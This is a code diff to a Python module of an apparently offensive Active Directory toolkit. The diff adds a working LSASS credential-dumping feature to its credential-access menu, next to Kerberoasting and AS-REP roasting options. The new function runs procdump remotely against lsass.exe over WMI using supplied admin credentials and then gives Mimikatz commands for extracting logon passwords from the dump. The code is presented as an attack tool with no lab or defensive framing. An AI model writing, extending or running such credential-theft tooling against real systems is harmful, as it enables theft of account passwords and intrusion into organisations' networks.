@@ -2,13 +2,14 @@ import subprocess
 import shlex
 import os
 from datetime import datetime
+from modules import execution
 
 def run():
     while True:
         print("\n--- Credential Access ---")
         print("1. Kerberoasting")
         print("2. AS-REP Roasting")
-        print("3. (Coming Soon) Dump LSASS (Mimikatz)")
+        print("3. Dump LSASS (Mimikatz)")
         print("99. Return to Main Menu")
 
         choice = input("Enter your choice: ")
@@ -23,6 +24,8 @@ def run():
             target_ip = input("Enter Target IP (Domain Controller): ")
             domain = input("Enter Target Domain (e.g., contoso.local): ")
             asrep_roast(target_ip, domain)
+        elif choice == '3':
+            dump_lsass()
         elif choice == '99':
             print("Returning to main menu...")
             return
@@ -34,6 +37,37 @@ def ensure_loot_dir():
     """Ensures the loot directory exists."""
     if not os.path.exists("loot"):
         os.makedirs("loot")
+
+def dump_lsass():
+    print("\n[+] LSASS Dump Workflow")
+    print("[!] This requires administrative rights on the target machine.")
+    print("[!] You must have uploaded procdump.exe to the target (e.g., to C:\\temp\\procdump.exe).")
+
+    domain = input("Enter Target Domain: ")
+    target_ip = input("Enter IP of the target host to dump LSASS from: ")
+    username = input("Enter Username (with admin rights on target): ")
+    password = input("Enter Password: ")
+    
+    procdump_path = input("Enter the full path to procdump.exe on the target machine: ")
+    dump_path = "C:\\Windows\\Temp\\lsass.dmp" # A common writable directory
+    
+    # Command to dump the lsass.exe process
+    # -ma: Write a full dump file.
+    # -accepteula: Silently accept the EULA.
+    # lsass.exe: The process to dump.
+    # dump_path: Where to save the dump file.
+    command_to_run = f"{procdump_path} -ma -accepteula lsass.exe {dump_path}"
+    
+    print("\n[*] Preparing to execute procdump on the target...")
+    if execution.wmi_exec(target_ip, domain, username, password, command_to_run):
+        print("\n[+] Procdump command sent successfully.")
+        print(f"[*] The LSASS dump should now be at {dump_path} on the target machine.")
+        print("[*] You must retrieve this file and use Mimikatz on your attacker machine to parse it.")
+        print("[*] Example Mimikatz command: `sekurlsa::minidump lsass.dmp` followed by `sekurlsa::logonpasswords`")
+    else:
+        print("\n[-] Failed to execute procdump.")
+    
+    input("\nPress Enter to continue...")
 
 def kerberoast(target_ip, domain, username, password):
     print("\n[+] Performing Kerberoasting attack...")
